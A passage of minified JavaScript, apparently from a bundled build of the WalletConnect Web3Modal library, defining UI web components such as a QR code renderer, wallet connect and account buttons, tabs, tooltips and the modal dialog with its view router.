r=Array.prototype.slice.call(S0.create(e,{errorCorrectionLevel:t}).modules.data,0),n=Math.sqrt(r.length);return r.reduce(((e,t,r)=>(r%n==0?e.push([t]):e[e.length-1].push(t))&&e),[])}const KU={generate(e,t,r){const n="#141414",i=[],o=GU(e,"Q"),s=t/o.length,a=[{x:0,y:0},{x:1,y:0},{x:0,y:1}];a.forEach((({x:e,y:t})=>{const r=(o.length-7)*s*e,c=(o.length-7)*s*t,l=.45;for(let e=0;e<a.length;e+=1){const t=s*(7-2*e);i.push(ze`
            <rect
              fill=${2===e?n:"transparent"}
              width=${0===e?t-5:t}
              rx= ${0===e?(t-5)*l:t*l}
              ry= ${0===e?(t-5)*l:t*l}
              stroke=${n}
              stroke-width=${0===e?5:0}
              height=${0===e?t-5:t}
              x= ${0===e?c+s*e+2.5:c+s*e}
              y= ${0===e?r+s*e+2.5:r+s*e}
            />
          `)}}));const c=Math.floor((r+25)/s),l=o.length/2-c/2,u=o.length/2+c/2-1,h=[];o.forEach(((e,t)=>{e.forEach(((e,r)=>{if(o[t][r]&&!(t<7&&r<7||t>o.length-8&&r<7||t<7&&r>o.length-8)&&!(t>l&&t<u&&r>l&&r<u)){const e=t*s+s/2,n=r*s+s/2;h.push([e,n])}}))}));const d={};return h.forEach((([e,t])=>{var r;d[e]?null==(r=d[e])||r.push(t):d[e]=[t]})),Object.entries(d).map((([e,t])=>{const r=t.filter((e=>t.every((t=>!yw(e,t,s)))));return[Number(e),r]})).forEach((([e,t])=>{t.forEach((t=>{i.push(ze`<circle cx=${e} cy=${t} fill=${n} r=${s/eE} />`)}))})),Object.entries(d).filter((([e,t])=>t.length>1)).map((([e,t])=>{const r=t.filter((e=>t.some((t=>yw(e,t,s)))));return[Number(e),r]})).map((([e,t])=>{t.sort(((e,t)=>e<t?-1:1));const r=[];for(const e of t){const t=r.find((t=>t.some((t=>yw(e,t,s)))));t?t.push(e):r.push([e])}return[e,r.map((e=>[e[0],e[e.length-1]]))]})).forEach((([e,t])=>{t.forEach((([t,r])=>{i.push(ze`
              <line
                x1=${e}
                x2=${e}
                y1=${t}
                y2=${r}
                stroke=${n}
                stroke-width=${s/1.25}
                stroke-linecap="round"
              />
            `)}))})),i}},JU=Qe`
  :host {
    position: relative;
    user-select: none;
    display: block;
    overflow: hidden;
    aspect-ratio: 1 / 1;
    width: var(--local-size);
  }

  :host([data-theme='dark']) {
    border-radius: clamp(0px, var(--wui-border-radius-l), 40px);
    background-color: var(--wui-color-inverse-100);
    padding: var(--wui-spacing-l);
  }

  :host([data-theme='light']) {
    outline: 1px solid var(--wui-color-bg-125);
    background-color: var(--wui-color-bg-125);
  }

  svg:first-child,
  wui-image,
  wui-icon {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translateY(-50%) translateX(-50%);
  }

  wui-image {
    width: 25%;
    height: 25%;
    border-radius: var(--wui-border-radius-xs);
  }

  wui-icon {
    width: 100%;
    height: 100%;
    color: #3396ff !important;
    transform: translateY(-50%) translateX(-50%) scale(0.25);
  }
`;var sh=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Mc=class extends $e{constructor(){super(...arguments),this.uri="",this.size=0,this.theme="dark",this.imageSrc=void 0,this.alt=void 0}render(){return this.dataset.theme=this.theme,this.style.cssText=`--local-size: ${this.size}px`,pe`${this.templateVisual()} ${this.templateSvg()}`}templateSvg(){const e="light"===this.theme?this.size:this.size-32;return ze`
      <svg height=${e} width=${e}>
        ${KU.generate(this.uri,e,e/4)}
      </svg>
    `}templateVisual(){return this.imageSrc?pe`<wui-image src=${this.imageSrc} alt=${this.alt??"logo"}></wui-image>`:pe`<wui-icon size="inherit" color="inherit" name="walletConnect"></wui-icon>`}};Mc.styles=[Rt,JU],sh([ve()],Mc.prototype,"uri",void 0),sh([ve({type:Number})],Mc.prototype,"size",void 0),sh([ve()],Mc.prototype,"theme",void 0),sh([ve()],Mc.prototype,"imageSrc",void 0),sh([ve()],Mc.prototype,"alt",void 0),Mc=sh([De("wui-qr-code")],Mc);const ZU=Qe`
  :host {
    position: relative;
    display: inline-block;
    width: 100%;
  }
`;var QU=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let s2=class extends $e{constructor(){super(...arguments),this.inputComponentRef=jA()}render(){return pe`
      <wui-input-text
        ${UA(this.inputComponentRef)}
        placeholder="Search wallet"
        icon="search"
        type="search"
        enterKeyHint="search"
        size="sm"
      >
        <wui-input-element @click=${this.clearValue} icon="close"></wui-input-element>
      </wui-input-text>
    `}clearValue(){const e=this.inputComponentRef.value,t=null==e?void 0:e.inputElementRef.value;t&&(t.value="",t.focus(),t.dispatchEvent(new Event("input")))}};s2.styles=[Rt,ZU],s2=QU([De("wui-search-bar")],s2);const YU=Qe`
  :host {
    display: flex;
    column-gap: var(--wui-spacing-xs);
    align-items: center;
    padding: 7px var(--wui-spacing-l) 7px var(--wui-spacing-xs);
    border-radius: var(--wui-border-radius-3xl);
    border: 1px solid var(--wui-gray-glass-005);
    background-color: var(--wui-color-bg-175);
    box-shadow:
      0px 14px 64px -4px rgba(0, 0, 0, 0.15),
      0px 8px 22px -6px rgba(0, 0, 0, 0.15);
  }
`;var A0=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let zl=class extends $e{constructor(){super(...arguments),this.backgroundColor="accent-100",this.iconColor="accent-100",this.icon="checkmark",this.message=""}render(){return pe`
      <wui-icon-box
        size="sm"
        iconColor=${this.iconColor}
        backgroundColor=${this.backgroundColor}
        icon=${this.icon}
      ></wui-icon-box>
      <wui-text variant="paragraph-500" color="fg-100">${this.message}</wui-text>
    `}};zl.styles=[Rt,YU],A0([ve()],zl.prototype,"backgroundColor",void 0),A0([ve()],zl.prototype,"iconColor",void 0),A0([ve()],zl.prototype,"icon",void 0),A0([ve()],zl.prototype,"message",void 0),zl=A0([De("wui-snackbar")],zl);const XU=Qe`
  :host {
    display: inline-flex;
    background-color: var(--wui-gray-glass-002);
    border-radius: var(--wui-border-radius-3xl);
    padding: var(--wui-spacing-3xs);
    position: relative;
    height: 36px;
    overflow: hidden;
  }

  :host::before {
    content: '';
    position: absolute;
    pointer-events: none;
    top: 4px;
    left: 4px;
    display: block;
    width: var(--local-tab-width);
    height: 28px;
    border-radius: var(--wui-border-radius-3xl);
    background-color: var(--wui-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-gray-glass-002);
    transform: translateX(calc(var(--local-tab) * var(--local-tab-width)));
    transition: transform var(--wui-ease-out-power-2) var(--wui-duration-lg);
  }

  :host([data-type='flex'])::before {
    left: 3px;
    transform: translateX(calc((var(--local-tab) * 34px) + (var(--local-tab) * 4px)));
  }

  :host([data-type='flex']) {
    display: flex;
    padding: 0px 0px 0px 12px;
    gap: 4px;
  }

  :host([data-type='flex']) > button > wui-text {
    position: absolute;
    left: 18px;
    opacity: 0;
  }

  button[data-active='true'] > wui-icon,
  button[data-active='true'] > wui-text {
    color: var(--wui-color-fg-100);
  }

  button[data-active='false'] > wui-icon,
  button[data-active='false'] > wui-text {
    color: var(--wui-color-fg-200);
  }

  button[data-active='true']:disabled,
  button[data-active='false']:disabled {
    background-color: transparent;
    opacity: 0.5;
    cursor: not-allowed;
  }

  button[data-active='true']:disabled > wui-text {
    color: var(--wui-color-fg-200);
  }

  button[data-active='false']:disabled > wui-text {
    color: var(--wui-color-fg-300);
  }

  button > wui-icon,
  button > wui-text {
    pointer-events: none;
    transition: all var(--wui-ease-out-power-2) var(--wui-duration-lg);
  }

  button {
    width: var(--local-tab-width);
  }

  :host([data-type='flex']) > button {
    width: 34px;
    position: relative;
    display: flex;
    justify-content: flex-start;
  }

  button:hover:enabled,
  button:active:enabled {
    background-color: transparent !important;
  }

  button:hover:enabled > wui-icon,
  button:active:enabled > wui-icon {
    color: var(--wui-color-fg-125);
  }

  button:hover:enabled > wui-text,
  button:active:enabled > wui-text {
    color: var(--wui-color-fg-125);
  }
`;var qc=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Yo=class extends $e{constructor(){super(...arguments),this.tabs=[],this.onTabChange=()=>null,this.buttons=[],this.disabled=!1,this.activeTab=0,this.localTabWidth="100px",this.isDense=!1}render(){return this.isDense=this.tabs.length>3,this.style.cssText=`\n      --local-tab: ${this.activeTab};\n      --local-tab-width: ${this.localTabWidth};\n    `,this.dataset.type=this.isDense?"flex":"block",this.tabs.map(((e,t)=>{const r=t===this.activeTab;return pe`
        <button
          ?disabled=${this.disabled}
          @click=${()=>this.onTabClick(t)}
          data-active=${r}
        >
          <wui-icon size="sm" color="inherit" name=${e.icon}></wui-icon>
          <wui-text variant="small-600" color="inherit"> ${e.label} </wui-text>
        </button>
      `}))}firstUpdated(){this.shadowRoot&&this.isDense&&(this.buttons=[...this.shadowRoot.querySelectorAll("button")],setTimeout((()=>{this.animateTabs(0,!0)}),0))}onTabClick(e){this.buttons&&this.animateTabs(e,!1),this.activeTab=e,this.onTabChange(e)}animateTabs(e,t){const r=this.buttons[this.activeTab],n=this.buttons[e],i=null==r?void 0:r.querySelector("wui-text"),o=null==n?void 0:n.querySelector("wui-text"),s=null==n?void 0:n.getBoundingClientRect(),a=null==o?void 0:o.getBoundingClientRect();r&&i&&!t&&e!==this.activeTab&&(i.animate([{opacity:0}],{duration:50,easing:"ease",fill:"forwards"}),r.animate([{width:"34px"}],{duration:500,easing:"ease",fill:"forwards"})),n&&s&&a&&o&&(e!==this.activeTab||t)&&(this.localTabWidth=`${Math.round(s.width+a.width)+6}px`,n.animate([{width:`${s.width+a.width}px`}],{duration:t?0:500,fill:"forwards",easing:"ease"}),o.animate([{opacity:1}],{duration:t?0:125,delay:t?0:200,fill:"forwards",easing:"ease"}))}};Yo.styles=[Rt,dn,XU],qc([ve({type:Array})],Yo.prototype,"tabs",void 0),qc([ve()],Yo.prototype,"onTabChange",void 0),qc([ve({type:Array})],Yo.prototype,"buttons",void 0),qc([ve({type:Boolean})],Yo.prototype,"disabled",void 0),qc([xt()],Yo.prototype,"activeTab",void 0),qc([xt()],Yo.prototype,"localTabWidth",void 0),qc([xt()],Yo.prototype,"isDense",void 0),Yo=qc([De("wui-tabs")],Yo);const eW=Qe`
  :host {
    display: block;
    padding: 9px var(--wui-spacing-s) 10px var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-xxs);
    background-color: var(--wui-color-fg-100);
    color: var(--wui-color-bg-100);
    position: relative;
  }

  wui-icon {
    position: absolute;
    width: 12px !important;
    height: 4px !important;
  }

  wui-icon[data-placement='top'] {
    bottom: 0;
    left: 50%;
    transform: translate(-50%, 95%);
  }

  wui-icon[data-placement='bottom'] {
    top: 0;
    left: 50%;
    transform: translate(-50%, -95%) rotate(180deg);
  }

  wui-icon[data-placement='right'] {
    top: 50%;
    left: 0;
    transform: translate(-65%, -50%) rotate(90deg);
  }

  wui-icon[data-placement='left'] {
    top: 50%;
    right: 0%;
    transform: translate(65%, -50%) rotate(270deg);
  }
`;var L3=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let r0=class extends $e{constructor(){super(...arguments),this.placement="top",this.message=""}render(){return pe`<wui-icon
        data-placement=${this.placement}
        color="fg-100"
        size="inherit"
        name="cursor"
      ></wui-icon>
      <wui-text color="inherit" variant="small-500">${this.message}</wui-text>`}};r0.styles=[Rt,dn,eW],L3([ve()],r0.prototype,"placement",void 0),L3([ve()],r0.prototype,"message",void 0),r0=L3([De("wui-tooltip")],r0);const tW=Qe`
  :host {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 64px;
    height: 64px;
    outline: 8px solid var(--wui-thumbnail-border);
    border-radius: var(--local-border-radius);
    overflow: hidden;
  }

  wui-icon {
    width: 32px;
    height: 32px;
  }
`;var Ev=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Of=class extends $e{render(){return this.style.cssText=`--local-border-radius: ${this.borderRadiusFull?"1000px":"20px"};`,pe`${this.templateVisual()}`}templateVisual(){return this.imageSrc?pe`<wui-image src=${this.imageSrc} alt=${this.alt??""}></wui-image>`:pe`<wui-icon
      data-parent-size="md"
      size="inherit"
      color="inherit"
      name="walletPlaceholder"
    ></wui-icon>`}};Of.styles=[Rt,tW],Ev([ve()],Of.prototype,"imageSrc",void 0),Ev([ve()],Of.prototype,"alt",void 0),Ev([ve({type:Boolean})],Of.prototype,"borderRadiusFull",void 0),Of=Ev([De("wui-visual-thumbnail")],Of);const rW=Qe`
  :host {
    display: grid;
    width: inherit;
    height: inherit;
  }
`;var js=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let zi=class extends $e{render(){return this.style.cssText=`\n      grid-template-rows: ${this.gridTemplateRows};\n      grid-template-columns: ${this.gridTemplateColumns};\n      justify-items: ${this.justifyItems};\n      align-items: ${this.alignItems};\n      justify-content: ${this.justifyContent};\n      align-content: ${this.alignContent};\n      column-gap: ${this.columnGap&&`var(--wui-spacing-${this.columnGap})`};\n      row-gap: ${this.rowGap&&`var(--wui-spacing-${this.rowGap})`};\n      gap: ${this.gap&&`var(--wui-spacing-${this.gap})`};\n      padding-top: ${this.padding&&Mr.getSpacingStyles(this.padding,0)};\n      padding-right: ${this.padding&&Mr.getSpacingStyles(this.padding,1)};\n      padding-bottom: ${this.padding&&Mr.getSpacingStyles(this.padding,2)};\n      padding-left: ${this.padding&&Mr.getSpacingStyles(this.padding,3)};\n      margin-top: ${this.margin&&Mr.getSpacingStyles(this.margin,0)};\n      margin-right: ${this.margin&&Mr.getSpacingStyles(this.margin,1)};\n      margin-bottom: ${this.margin&&Mr.getSpacingStyles(this.margin,2)};\n      margin-left: ${this.margin&&Mr.getSpacingStyles(this.margin,3)};\n    `,pe`<slot></slot>`}};zi.styles=[Rt,rW],js([ve()],zi.prototype,"gridTemplateRows",void 0),js([ve()],zi.prototype,"gridTemplateColumns",void 0),js([ve()],zi.prototype,"justifyItems",void 0),js([ve()],zi.prototype,"alignItems",void 0),js([ve()],zi.prototype,"justifyContent",void 0),js([ve()],zi.prototype,"alignContent",void 0),js([ve()],zi.prototype,"columnGap",void 0),js([ve()],zi.prototype,"rowGap",void 0),js([ve()],zi.prototype,"gap",void 0),js([ve()],zi.prototype,"padding",void 0),js([ve()],zi.prototype,"margin",void 0),zi=js([De("wui-grid")],zi);const nW=Qe`
  :host {
    position: relative;
    display: flex;
    width: 100%;
    height: 1px;
    background-color: var(--wui-gray-glass-005);
    justify-content: center;
    align-items: center;
  }

  :host > wui-text {
    position: absolute;
    padding: 0px 10px;
    background-color: var(--wui-color-bg-125);
  }
`;var u9=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Rg=class extends $e{constructor(){super(...arguments),this.text=""}render(){return pe`${this.template()}`}template(){return this.text?pe`<wui-text variant="small-500" color="fg-200">${this.text}</wui-text>`:null}};Rg.styles=[Rt,nW],u9([ve()],Rg.prototype,"text",void 0),Rg=u9([De("wui-separator")],Rg);var Ga=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Xo=class extends $e{constructor(){super(),this.unsubscribe=[],this.networkImages=Cc.state.networkImages,this.disabled=!1,this.balance="show",this.address=Rr.state.address,this.balanceVal=Rr.state.balance,this.balanceSymbol=Rr.state.balanceSymbol,this.profileName=Rr.state.profileName,this.profileImage=Rr.state.profileImage,this.network=Fr.state.caipNetwork,this.unsubscribe.push(Rr.subscribe((e=>{e.isConnected?(this.address=e.address,this.balanceVal=e.balance,this.profileName=e.profileName,this.profileImage=e.profileImage,this.balanceSymbol=e.balanceSymbol):(this.address="",this.balanceVal="",this.profileName="",this.profileImage="",this.balanceSymbol="")})),Fr.subscribeKey("caipNetwork",(e=>this.network=e)))}disconnectedCallback(){this.unsubscribe.forEach((e=>e()))}render(){var e;const t=this.networkImages[(null==(e=this.network)?void 0:e.imageId)??""],r="show"===this.balance;return pe`
      <wui-account-button
        .disabled=${!!this.disabled}
        address=${qt(this.profileName??this.address)}
        ?isProfileName=${!!this.profileName}
        networkSrc=${qt(t)}
        avatarSrc=${qt(this.profileImage)}
        balance=${r?pt.formatBalance(this.balanceVal,this.balanceSymbol):""}
        @click=${this.onClick.bind(this)}
      >
      </wui-account-button>
    `}onClick(){On.open()}};Ga([ve({type:Boolean})],Xo.prototype,"disabled",void 0),Ga([ve()],Xo.prototype,"balance",void 0),Ga([xt()],Xo.prototype,"address",void 0),Ga([xt()],Xo.prototype,"balanceVal",void 0),Ga([xt()],Xo.prototype,"balanceSymbol",void 0),Ga([xt()],Xo.prototype,"profileName",void 0),Ga([xt()],Xo.prototype,"profileImage",void 0),Ga([xt()],Xo.prototype,"network",void 0),Xo=Ga([De("w3m-account-button")],Xo);var iu=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let kc=class extends $e{constructor(){super(),this.unsubscribe=[],this.disabled=!1,this.balance=void 0,this.size=void 0,this.label=void 0,this.loadingLabel=void 0,this.isAccount=Rr.state.isConnected,this.unsubscribe.push(Rr.subscribeKey("isConnected",(e=>{this.isAccount=e})))}disconnectedCallback(){this.unsubscribe.forEach((e=>e()))}render(){return this.isAccount?pe`
          <w3m-account-button
            .disabled=${!!this.disabled}
            balance=${qt(this.balance)}
          >
          </w3m-account-button>
        `:pe`
          <w3m-connect-button
            size=${qt(this.size)}
            label=${qt(this.label)}
            loadingLabel=${qt(this.loadingLabel)}
          ></w3m-connect-button>
        `}};iu([ve({type:Boolean})],kc.prototype,"disabled",void 0),iu([ve()],kc.prototype,"balance",void 0),iu([ve()],kc.prototype,"size",void 0),iu([ve()],kc.prototype,"label",void 0),iu([ve()],kc.prototype,"loadingLabel",void 0),iu([xt()],kc.prototype,"isAccount",void 0),kc=iu([De("w3m-button")],kc);var I0=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Pf=class extends $e{constructor(){super(),this.unsubscribe=[],this.size="md",this.label="Connect Wallet",this.loadingLabel="Connecting...",this.open=On.state.open,this.unsubscribe.push(On.subscribeKey("open",(e=>this.open=e)))}disconnectedCallback(){this.unsubscribe.forEach((e=>e()))}render(){return pe`
      <wui-connect-button
        size=${qt(this.size)}
        .loading=${this.open}
        @click=${this.onClick.bind(this)}
      >
        ${this.open?this.loadingLabel:this.label}
      </wui-connect-button>
    `}onClick(){this.open?On.close():On.open()}};I0([ve()],Pf.prototype,"size",void 0),I0([ve()],Pf.prototype,"label",void 0),I0([ve()],Pf.prototype,"loadingLabel",void 0),I0([xt()],Pf.prototype,"open",void 0),Pf=I0([De("w3m-connect-button")],Pf);const iW=Qe`
  :host {
    z-index: var(--w3m-z-index);
    display: block;
    backface-visibility: hidden;
    will-change: opacity;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    pointer-events: none;
    opacity: 0;
    background-color: var(--wui-cover);
  }

  @keyframes zoom-in {
    0% {
      transform: scale(0.95) translateY(0);
    }
    100% {
      transform: scale(1) translateY(0);
    }
  }

  @keyframes slide-in {
    0% {
      transform: scale(1) translateY(50px);
    }
    100% {
      transform: scale(1) translateY(0);
    }
  }

  wui-card {
    max-width: 360px;
    width: 100%;
    position: relative;
    animation-delay: 0.3s;
    animation-duration: 0.2s;
    animation-name: zoom-in;
    animation-fill-mode: backwards;
    animation-timing-function: var(--wui-ease-out-power-2);
    outline: none;
  }

  wui-flex {
    overflow-x: hidden;
    overflow-y: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 100%;
    height: 100%;
  }

  @media (max-height: 700px) and (min-width: 431px) {
    wui-flex {
      align-items: flex-start;
    }

    wui-card {
      margin: var(--wui-spacing-xxl) 0px;
    }
  }

  @media (max-width: 430px) {
    wui-flex {
      align-items: flex-end;
    }

    wui-card {
      max-width: 100%;
      border-bottom-left-radius: 0;
      border-bottom-right-radius: 0;
      border-bottom: none;
      animation-name: slide-in;
    }
  }
`;var f9=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};const tE="scroll-lock";let n0=class extends $e{constructor(){super(),this.unsubscribe=[],this.abortController=void 0,this.open=On.state.open,this.initializeTheming(),rr.prefetch(),this.unsubscribe.push(On.subscribeKey("open",(e=>e?this.onOpen():this.onClose()))),kr.sendEvent({type:"track",event:"MODAL_LOADED"})}disconnectedCallback(){this.unsubscribe.forEach((e=>e())),this.onRemoveKeyboardListener()}render(){return this.open?pe`
          <wui-flex @click=${this.onOverlayClick.bind(this)}>
            <wui-card role="alertdialog" aria-modal="true" tabindex="0">
              <w3m-header></w3m-header>
              <w3m-router></w3m-router>
              <w3m-snackbar></w3m-snackbar>
            </wui-card>
          </wui-flex>
        `:null}onOverlayClick(e){e.target===e.currentTarget&&On.close()}initializeTheming(){const{themeVariables:e,themeMode:t}=Ts.state;HB(e,Mr.getColorTheme(t))}async onClose(){this.onScrollUnlock(),await this.animate([{opacity:1},{opacity:0}],{duration:200,easing:"ease",fill:"forwards"}).finished,po.hide(),this.open=!1,this.onRemoveKeyboardListener()}async onOpen(){this.onScrollLock(),this.open=!0,await this.animate([{opacity:0},{opacity:1}],{duration:200,easing:"ease",fill:"forwards",delay:300}).finished,this.onAddKeyboardListener()}onScrollLock(){const e=document.createElement("style");e.dataset.w3m=tE,e.textContent="\n      html, body {\n        touch-action: none;\n        overflow: hidden;\n        overscroll-behavior: contain;\n      }\n      w3m-modal {\n        pointer-events: auto;\n      }\n    ",document.head.appendChild(e)}onScrollUnlock(){const e=document.head.querySelector(`style[data-w3m="${tE}"]`);e&&e.remove()}onAddKeyboardListener(){var e;this.abortController=new AbortController;const t=null==(e=this.shadowRoot)?void 0:e.querySelector("wui-card");null==t||t.focus(),window.addEventListener("keydown",(e=>{if("Escape"===e.key)On.close();else if("Tab"===e.key){const{tagName:r}=e.target;r&&!r.includes("W3M-")&&!r.includes("WUI-")&&(null==t||t.focus())}}),this.abortController)}onRemoveKeyboardListener(){var e;null==(e=this.abortController)||e.abort(),this.abortController=void 0}};n0.styles=iW,f9([xt()],n0.prototype,"open",void 0),n0=f9([De("w3m-modal")],n0);const sW=Object.freeze(Object.defineProperty({__proto__:null,get W3mModal(){return n0}},Symbol.toStringTag,{value:"Module"}));var xv=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let i0=class extends $e{constructor(){super(),this.unsubscribe=[],this.disabled=!1,this.network=Fr.state.caipNetwork,this.connected=Rr.state.isConnected,this.unsubscribe.push(Fr.subscribeKey("caipNetwork",(e=>this.network=e)),Rr.subscribeKey("isConnected",(e=>this.connected=e)))}disconnectedCallback(){this.unsubscribe.forEach((e=>e()))}render(){var e;return pe`
      <wui-network-button
        .disabled=${!!this.disabled}
        imageSrc=${qt(wn.getNetworkImage(this.network))}
        @click=${this.onClick.bind(this)}
      >
        ${(null==(e=this.network)?void 0:e.name)??(this.connected?"Unknown Network":"Select Network")}
      </wui-network-button>
    `}onClick(){On.open({view:"Networks"})}};xv([ve({type:Boolean})],i0.prototype,"disabled",void 0),xv([xt()],i0.prototype,"network",void 0),xv([xt()],i0.prototype,"connected",void 0),i0=xv([De("w3m-network-button")],i0);const oW=Qe`
  :host {
    display: block;
    will-change: transform, opacity;
  }
`;var h9=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Tg=class extends $e{constructor(){super(),this.resizeObserver=void 0,this.prevHeight="0px",this.prevHistoryLength=1,this.unsubscribe=[],this.view=Ft.state.view,this.unsubscribe.push(Ft.subscribeKey("view",(e=>this.onViewChange(e))))}firstUpdated(){this.resizeObserver=new ResizeObserver((async([e])=>{const t=`${null==e?void 0:e.contentRect.height}px`;"0px"!==this.prevHeight&&(await this.animate([{height:this.prevHeight},{height:t}],{duration:150,easing:"ease",fill:"forwards"}).finished,this.style.height="auto"),this.prevHeight=t})),this.resizeObserver.observe(this.getWrapper())}disconnectedCallback(){var e;null==(e=this.resizeObserver)||e.unobserve(this.getWrapper()),this.unsubscribe.forEach((e=>e()))}render(){return pe`<div>${this.viewTemplate()}</div>`}viewTemplate(){switch(this.view){case"Connect":default:return pe`<w3m-connect-view></w3m-connect-view>`;case"ConnectingWalletConnect":return pe`<w3m-connecting-wc-view></w3m-connecting-wc-view>`;case"ConnectingExternal":return pe`<w3m-connecting-external-view></w3m-connecting-external-view>`;case"ConnectingSiwe":return pe`<w3m-connecting-siwe-view></w3m-connecting-siwe-view>`;case"AllWallets":return pe`<w3m-all-wallets-view></w3m-all-wallets-view>`;case"Networks":return pe`<w3m-networks-view></w3m-networks-view>`;case"SwitchNetwork":return pe`<w3m-network-switch-view></w3m-network-switch-view>`;case"Account":return pe`<w3m-account-view></w3m-account-view>`;case"WhatIsAWallet":return pe`<w3m-what-is-a-wallet-view></w3m-what-is-a-wallet-view>`;case"WhatIsANetwork":return pe`<w3m-what-is-a-network-view></w3m-what-is-a-network-view>`;case"GetWallet":return pe`<w3m-get-wallet-view></w3m-get-wallet-view>`;case"Downloads":return 